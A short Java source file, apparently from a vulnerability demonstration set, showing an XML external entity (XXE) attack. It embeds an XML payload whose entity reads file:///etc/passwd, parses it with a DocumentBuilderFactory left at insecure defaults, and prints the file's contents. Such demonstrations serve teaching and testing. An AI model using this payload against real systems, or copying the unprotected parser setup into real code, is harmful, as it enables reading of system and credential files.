package com.govuln.xxe;

import org.w3c.dom.Document;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import java.io.ByteArrayInputStream;

public class DocumentBuilderExample {
    public static void main(String[] args) throws Exception {
        String data = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n" +
                "<!DOCTYPE foo [\n" +
                "   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" > ]>\n" +
                "<foo>&xxe;</foo>";
        DocumentBuilder db = DocumentBuilderFactory.newInstance().newDocumentBuilder();
        Document doc = db.parse(new ByteArrayInputStream(data.getBytes()));
        System.out.println(doc.getDocumentElement().getTextContent());
    }
}
